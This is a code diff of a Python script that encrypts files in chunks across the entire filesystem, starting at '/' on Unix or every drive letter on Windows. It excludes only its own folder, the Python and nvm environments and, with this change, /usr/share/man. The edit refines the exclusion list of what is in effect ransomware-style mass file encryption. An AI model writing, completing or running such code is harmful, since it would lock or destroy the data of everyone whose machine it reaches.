@@ -48,6 +48,9 @@ python_env_path = os.path.dirname(os.path.dirname(sys.executable))
 # Get the Node.js environment path managed by nvm
 nvm_path = os.path.expanduser("~/.nvm")
 
+# Exclude /usr/share/man directory
+exclude_paths = [os.path.abspath(python_env_path), os.path.abspath(os.path.dirname(__file__)), os.path.abspath(nvm_path), "/usr/share/man"]
+
 # Function to encrypt a file
 def encrypt_file(file_path):
     try:
@@ -103,7 +106,6 @@ def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
 # Main function
 def main():
     root_dirs = ["/"] if platform.system() != "Windows" else [drive + ":\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(drive + ":\\")]
-    exclude_paths = [os.path.abspath(python_env_path), os.path.abspath(os.path.dirname(__file__)), os.path.abspath(nvm_path)]
     
     for root_dir in root_dirs:
         encrypt_files_in_chunks(root_dir, exclude_paths)
@@ -116,6 +118,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
